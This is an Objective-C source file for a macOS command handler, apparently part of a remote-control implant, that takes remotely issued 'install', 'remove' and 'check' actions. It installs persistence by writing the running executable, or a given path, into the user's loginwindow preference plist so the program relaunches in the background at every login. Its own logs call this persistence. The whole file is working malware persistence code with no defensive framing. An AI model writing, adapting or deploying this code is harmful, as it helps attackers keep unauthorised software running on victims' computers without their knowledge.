#import "ZLoginItemCommandHandler.h"
#import <CoreFoundation/CoreFoundation.h>
#import <mach-o/dyld.h>

@implementation ZLoginItemCommandHandler

- (instancetype)init {
    return [super initWithType:@"loginitem"];
}

- (NSString *)command {
    return @"loginitem";
}

- (void)executeCommand:(ZCommandModel *)command 
             completion:(void (^)(BOOL success, NSDictionary *result, NSError *error))completion {
    NSLog(@"Executing LoginItem command: %@", [command commandId]);
    
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    [result setObject:@"loginitem_response" forKey:@"type"];
    
    // Get command parameters from payload instead of params
    NSDictionary *payload = [command payload];
    NSString *action = [payload objectForKey:@"action"];
    NSString *targetPath = [payload objectForKey:@"path"];
    
    BOOL success = NO;
    
    if (!action) {
        // Default action is install
        action = @"install";
    }
    
    if ([action isEqualToString:@"install"]) {
        // Install as login item
        success = [self installLoginItemWithPath:targetPath];
        if (success) {
            [result setObject:@"completed" forKey:@"status"];
            [result setObject:@"Successfully installed as login item" forKey:@"message"];
        } else {
            [result setObject:@"failed" forKey:@"status"];
            [result setObject:@"Failed to install as login item" forKey:@"message"];
        }
    } else if ([action isEqualToString:@"remove"]) {
        // Remove login item
        success = [self removeLoginItemWithPath:targetPath];
        if (success) {
            [result setObject:@"completed" forKey:@"status"];
            [result setObject:@"Successfully removed login item" forKey:@"message"];
        } else {
            [result setObject:@"failed" forKey:@"status"];
            [result setObject:@"Failed to remove login item" forKey:@"message"];
        }
    } else if ([action isEqualToString:@"check"]) {
        // Check if installed
        BOOL isInstalled = [self isLoginItemInstalled:targetPath];
        [result setObject:@"completed" forKey:@"status"];
        [result setObject:[NSNumber numberWithBool:isInstalled] forKey:@"installed"];
        [result setObject:isInstalled ? @"Login item is installed" : @"Login item is not installed" forKey:@"message"];
        success = YES;
    } else {
        // Unknown action
        [result setObject:@"failed" forKey:@"status"];
        [result setObject:[NSString stringWithFormat:@"Unknown action: %@", action] forKey:@"message"];
    }
    
    completion(success, result, nil);
}

// Get current executable path
- (NSString *)getCurrentExecutablePath {
    uint32_t bufsize = 0;
    _NSGetExecutablePath(NULL, &bufsize);
    char *exePath = malloc(bufsize);
    if (!exePath || _NSGetExecutablePath(exePath, &bufsize) != 0) {
        free(exePath);
        return nil;
    }
    
    NSString *path = [NSString stringWithUTF8String:exePath];
    free(exePath);
    return path;
}

// Get the path to the loginwindow plist file
- (NSString *)getLoginwindowPlistPath {
    NSString *uuidString = [[[NSHost currentHost] localizedName] stringByAppendingString:@".local"];
    NSString *plistPath = [NSString stringWithFormat:@"%@/Library/Preferences/ByHost/com.apple.loginwindow.%@.plist",
                          NSHomeDirectory(), uuidString];
    
    // Debug log the path so we can verify it later
    NSLog(@"LoginItem: Using plist path: %@", plistPath);
    
    return plistPath;
}

- (BOOL)installLoginItemWithPath:(NSString *)targetPath {
    // If no path provided, use current executable
    if (!targetPath) {
        targetPath = [self getCurrentExecutablePath];
        if (!targetPath) {
            NSLog(@"LoginItem: Failed to get current executable path");
            return NO;
        }
    }
    
    NSLog(@"LoginItem: Installing persistence for path: %@", targetPath);
    
    NSString *plistPath = [self getLoginwindowPlistPath];
    const char *cPlistPath = [plistPath UTF8String];
    
    // Modify the plist with Core Foundation APIs
    CFURLRef fileURL = CFURLCreateFromFileSystemRepresentation(NULL, 
                                    (const UInt8 *)cPlistPath, 
                                    strlen(cPlistPath), 
                                    false);
    if (!fileURL) {
        NSLog(@"LoginItem: Failed to create file URL");
        return NO;
    }
    
    CFPropertyListRef propertyList = NULL;
    CFDataRef data = NULL;
    
    // Try to read existing plist
    if (CFURLCreateDataAndPropertiesFromResource(NULL, fileURL, &data, NULL, NULL, NULL)) {
        if (data) {
            propertyList = CFPropertyListCreateWithData(NULL, data,
                            kCFPropertyListMutableContainers, NULL, NULL);
            CFRelease(data);
        }
    }
    
    // If no plist exists, create one
    if (propertyList == NULL) {
        propertyList = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        if (!propertyList) {
            NSLog(@"LoginItem: Failed to create property list");
            CFRelease(fileURL);
            return NO;
        }
    }
    
    // Get (or create) the array for login items
    CFMutableArrayRef apps = (CFMutableArrayRef)
        CFDictionaryGetValue(propertyList, CFSTR("TALAppsToRelaunchAtLogin"));
    
    if (!apps) {
        apps = CFArrayCreateMutable(kCFAllocatorDefault, 0, &kCFTypeArrayCallBacks);
        CFDictionarySetValue((CFMutableDictionaryRef)propertyList,
                             CFSTR("TALAppsToRelaunchAtLogin"), apps);
        CFRelease(apps);
        
        // Get the array again now that it's in the dictionary
        apps = (CFMutableArrayRef)CFDictionaryGetValue(propertyList, CFSTR("TALAppsToRelaunchAtLogin"));
    }
    
    // Make sure we're not already in the list
    BOOL alreadyExists = NO;
    CFStringRef targetPathStr = CFStringCreateWithCString(kCFAllocatorDefault, 
                                                        [targetPath UTF8String], 
                                                        kCFStringEncodingUTF8);
    
    for (CFIndex i = 0; i < CFArrayGetCount(apps); i++) {
        CFDictionaryRef appDict = CFArrayGetValueAtIndex(apps, i);
        CFStringRef path = CFDictionaryGetValue(appDict, CFSTR("Path"));
        
        if (path && CFStringCompare(path, targetPathStr, 0) == kCFCompareEqualTo) {
            alreadyExists = YES;
            break;
        }
    }
    
    CFRelease(targetPathStr);
    
    // If not already in the list, add it
    if (!alreadyExists) {
        // Create a new entry for our app
        CFMutableDictionaryRef newApp = CFDictionaryCreateMutable(kCFAllocatorDefault,
                                        3, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        
        // Set BackgroundState to 2 (background app)
        int state = 2;
        CFNumberRef bgState = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &state);
        CFDictionarySetValue(newApp, CFSTR("BackgroundState"), bgState);
        CFRelease(bgState);
        
        // Set the executable path
        CFStringRef exePathStr = CFStringCreateWithCString(kCFAllocatorDefault, 
                                            [targetPath UTF8String],
                                            kCFStringEncodingUTF8);
        CFDictionarySetValue(newApp, CFSTR("Path"), exePathStr);
        CFRelease(exePathStr);
        
        // Add our entry to the array
        CFArrayAppendValue(apps, newApp);
        CFRelease(newApp);
        
        // Write back to disk
        CFDataRef newData = CFPropertyListCreateData(kCFAllocatorDefault, propertyList,
                                        kCFPropertyListXMLFormat_v1_0, 0, NULL);
        
        if (newData) {
            FILE *plistFile = fopen(cPlistPath, "wb");
            if (plistFile != NULL) {
                fwrite(CFDataGetBytePtr(newData), sizeof(UInt8),
                       CFDataGetLength(newData), plistFile);
                fclose(plistFile);
                NSLog(@"LoginItem: Successfully wrote to plist file");
            } else {
                NSLog(@"LoginItem: Failed to open plist file for writing");
                CFRelease(newData);
                CFRelease(propertyList);
                CFRelease(fileURL);
                return NO;
            }
            CFRelease(newData);
        } else {
            NSLog(@"LoginItem: Failed to create data from property list");
            CFRelease(propertyList);
            CFRelease(fileURL);
            return NO;
        }
    } else {
        NSLog(@"LoginItem: Entry already exists in plist");
    }
    
    CFRelease(propertyList);
    CFRelease(fileURL);
    return YES;
}

- (BOOL)removeLoginItemWithPath:(NSString *)targetPath {
    // If no path provided, use current executable
    if (!targetPath) {
        targetPath = [self getCurrentExecutablePath];
        if (!targetPath) {
            NSLog(@"LoginItem: Failed to get current executable path");
            return NO;
        }
    }
    
    NSLog(@"LoginItem: Removing persistence for path: %@", targetPath);
    
    NSString *plistPath = [self getLoginwindowPlistPath];
    const char *cPlistPath = [plistPath UTF8String];
    
    // Open the plist file
    CFURLRef fileURL = CFURLCreateFromFileSystemRepresentation(NULL, 
                                        (const UInt8 *)cPlistPath, 
                                        strlen(cPlistPath), 
                                        false);
    if (!fileURL) {
        NSLog(@"LoginItem: Failed to create file URL");
        return NO;
    }
    
    CFPropertyListRef propertyList = NULL;
    CFDataRef data = NULL;
    
    // Try to read existing plist
    if (!CFURLCreateDataAndPropertiesFromResource(NULL, fileURL, &data, NULL, NULL, NULL) || !data) {
        NSLog(@"LoginItem: Plist file does not exist or could not be read");
        CFRelease(fileURL);
        return NO;
    }
    
    propertyList = CFPropertyListCreateWithData(NULL, data,
                    kCFPropertyListMutableContainers, NULL, NULL);
    CFRelease(data);
    
    if (!propertyList) {
        NSLog(@"LoginItem: Failed to parse property list");
        CFRelease(fileURL);
        return NO;
    }
    
    // Get the array of login items
    CFMutableArrayRef apps = (CFMutableArrayRef)
        CFDictionaryGetValue(propertyList, CFSTR("TALAppsToRelaunchAtLogin"));
    
    if (!apps) {
        NSLog(@"LoginItem: No login items found in plist");
        CFRelease(propertyList);
        CFRelease(fileURL);
        return YES;  // Already removed
    }
    
    // Find and remove our entry
    CFStringRef targetPathStr = CFStringCreateWithCString(kCFAllocatorDefault, 
                                                        [targetPath UTF8String], 
                                                        kCFStringEncodingUTF8);
    
    BOOL found = NO;
    for (CFIndex i = CFArrayGetCount(apps) - 1; i >= 0; i--) {
        CFDictionaryRef appDict = CFArrayGetValueAtIndex(apps, i);
        CFStringRef path = CFDictionaryGetValue(appDict, CFSTR("Path"));
        
        if (path && CFStringCompare(path, targetPathStr, 0) == kCFCompareEqualTo) {
            CFArrayRemoveValueAtIndex(apps, i);
            found = YES;
        }
    }
    
    CFRelease(targetPathStr);
    
    if (found) {
        // Write the modified plist back to disk
        CFDataRef newData = CFPropertyListCreateData(kCFAllocatorDefault, propertyList,
                                        kCFPropertyListXMLFormat_v1_0, 0, NULL);
        
        if (newData) {
            FILE *plistFile = fopen(cPlistPath, "wb");
            if (plistFile != NULL) {
                fwrite(CFDataGetBytePtr(newData), sizeof(UInt8),
                       CFDataGetLength(newData), plistFile);
                fclose(plistFile);
                NSLog(@"LoginItem: Successfully removed entry from plist");
            } else {
                NSLog(@"LoginItem: Failed to open plist file for writing");
                CFRelease(newData);
                CFRelease(propertyList);
                CFRelease(fileURL);
                return NO;
            }
            CFRelease(newData);
        } else {
            NSLog(@"LoginItem: Failed to create data from property list");
            CFRelease(propertyList);
            CFRelease(fileURL);
            return NO;
        }
    } else {
        NSLog(@"LoginItem: Entry not found in plist");
    }
    
    CFRelease(propertyList);
    CFRelease(fileURL);
    return YES;
}

- (BOOL)isLoginItemInstalled:(NSString *)targetPath {
    // If no path provided, use current executable
    if (!targetPath) {
        targetPath = [self getCurrentExecutablePath];
        if (!targetPath) {
            NSLog(@"LoginItem: Failed to get current executable path");
            return NO;
        }
    }
    
    NSString *plistPath = [self getLoginwindowPlistPath];
    const char *cPlistPath = [plistPath UTF8String];
    
    // Open the plist file
    CFURLRef fileURL = CFURLCreateFromFileSystemRepresentation(NULL, 
                                        (const UInt8 *)cPlistPath, 
                                        strlen(cPlistPath), 
                                        false);
    if (!fileURL) {
        NSLog(@"LoginItem: Failed to create file URL");
        return NO;
    }
    
    CFPropertyListRef propertyList = NULL;
    CFDataRef data = NULL;
    
    // Try to read existing plist
    if (!CFURLCreateDataAndPropertiesFromResource(NULL, fileURL, &data, NULL, NULL, NULL) || !data) {
        NSLog(@"LoginItem: Plist file does not exist or could not be read");
        CFRelease(fileURL);
        return NO;
    }
    
    propertyList = CFPropertyListCreateWithData(NULL, data,
                    kCFPropertyListMutableContainers, NULL, NULL);
    CFRelease(data);
    
    if (!propertyList) {
        NSLog(@"LoginItem: Failed to parse property list");
        CFRelease(fileURL);
        return NO;
    }
    
    // Get the array of login items
    CFArrayRef apps = CFDictionaryGetValue(propertyList, CFSTR("TALAppsToRelaunchAtLogin"));
    
    if (!apps) {
        NSLog(@"LoginItem: No login items found in plist");
        CFRelease(propertyList);
        CFRelease(fileURL);
        return NO;
    }
    
    // Check if our entry exists
    CFStringRef targetPathStr = CFStringCreateWithCString(kCFAllocatorDefault, 
                                                        [targetPath UTF8String], 
                                                        kCFStringEncodingUTF8);
    
    BOOL found = NO;
    for (CFIndex i = 0; i < CFArrayGetCount(apps); i++) {
        CFDictionaryRef appDict = CFArrayGetValueAtIndex(apps, i);
        CFStringRef path = CFDictionaryGetValue(appDict, CFSTR("Path"));
        
        if (path && CFStringCompare(path, targetPathStr, 0) == kCFCompareEqualTo) {
            found = YES;
            break;
        }
    }
    
    CFRelease(targetPathStr);
    CFRelease(propertyList);
    CFRelease(fileURL);
    
    return found;
}

@end 